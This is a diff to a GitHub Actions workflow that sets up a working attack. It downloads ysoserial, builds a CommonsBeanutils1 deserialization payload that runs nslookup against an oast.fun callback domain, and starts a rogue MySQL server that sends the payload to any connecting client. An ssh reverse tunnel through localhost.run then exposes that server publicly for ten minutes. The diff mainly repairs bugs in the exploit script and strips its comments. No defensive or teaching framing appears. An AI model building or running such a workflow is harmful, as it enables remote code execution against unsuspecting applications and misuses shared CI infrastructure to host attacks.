@@ -8,22 +8,22 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Install Java
-        uses: actions/setup-java@v5
+        uses: actions/setup-java@v4
         with:
+          distribution: temurin
           java-version: '17'
 
       - name: Download ysoserial
         run: |
-          wget -q "https://github.com/frohoff/ysoserial/releases/download/latest/ysoserial-all.jar" -O ysoserial-all.jar
-          # Fallback: try mirror
-          if [ ! -f ysoserial-all.jar ]; then
-            wget -q "https://github.com/frohoff/ysoserial/releases/download/latest/ysoserial-all.jar" -O ysoserial-all.jar 2>/dev/null || true
+          wget -q "https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar" -O ysoserial-all.jar || true
+          if [ ! -s ysoserial-all.jar ]; then
+            wget -q "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar" -O ysoserial-all.jar || true
           fi
           ls -la ysoserial-all.jar || echo "ysoserial download failed"
 
       - name: Generate payload
         run: |
-          java -jar ysoserial-all.jar CommonsBeanutils1 "nslookup mysql-deser-dns.d9jtljuucu0k5v69pvg03gsrqqb8ios7n.oast.fun" > payload.bin 2>/dev/null || true
+          java -jar ysoserial-all.jar CommonsBeanutils1 "nslookup mysql-deser-dns.d9jtljuucu0k5v69pvg03gsrpqb8ios7n.oast.fun" > payload.bin 2>/dev/null || true
           if [ -f payload.bin ]; then
             echo "Payload generated: $(wc -c < payload.bin) bytes"
           else
@@ -51,15 +51,15 @@ jobs:
               p += struct.pack('<H', 0x00ff)
               p += b'\x15'
               p += b'\x00' * 10
-              p += b'IGHKLMNOPQRSTU\\00'
-              p += b'mysql_native_password\\00'
+              p += b'IGHKLMNOPQRSTU\x00'
+              p += b'mysql_native_password\x00'
               return make_packet(p)
 
-          def ok _packet():
+          def ok_packet():
               return make_packet(b'\x00\x00\x02\x00\x00\x00', seq=2)
 
           def err_packet():
-              return make_packet(b'\xff\x15\x04\\23H000\x00' + b'\\00' * 100, seq=2)
+              return make_packet(b'\xff\x15\x04\x23H000\x00' + b'\x00' * 100, seq=2)
 
           def handle(conn, addr, payload):
               print(f'[+] Connection from {addr}', flush=True)
@@ -70,7 +70,6 @@ jobs:
                   conn.send(ok_packet())
                   data = conn.recv(4096)
                   print(f'[*] Query: {len(data)} bytes', flush=True)
-                  # Send payload as error packet with serialized object
                   conn.send(err_packet())
                   conn.send(payload)
                   print('[+] Payload sent', flush=True)
@@ -103,23 +102,19 @@ jobs:
 
       - name: Start server and tunnel
         run: |
-          # Start rogue MySQL server in background
           python3 rogue_mysql.py payload.bin &
           server_PID=$!
           sleep 2
 
-          # Try localhost.rut reverse tunnel
           echo "[*] Starting reverse tunnel..."
-          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -\ -8888 nokey@localhost.run 80:localhost:3306 2>&1 &
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 8888 nokey@localhost.run 80:localhost:3306 2>&1 &
           tunnel_PID=$!
           sleep 5
 
-          # Check if tunnel is up
           echo "[*] Tunnel PID: ${tunnel_PID}"
           echo "[*] Server PID: ${server_PID}"
           ps aux | grep -e 'ssh --' -e 'rogue_mysql' | grep -v grep
 
-          # Keep alive for 10 minutes
           echo "[*] Server running. Keeping alive for 10 minutes..."
           sleep 600
 
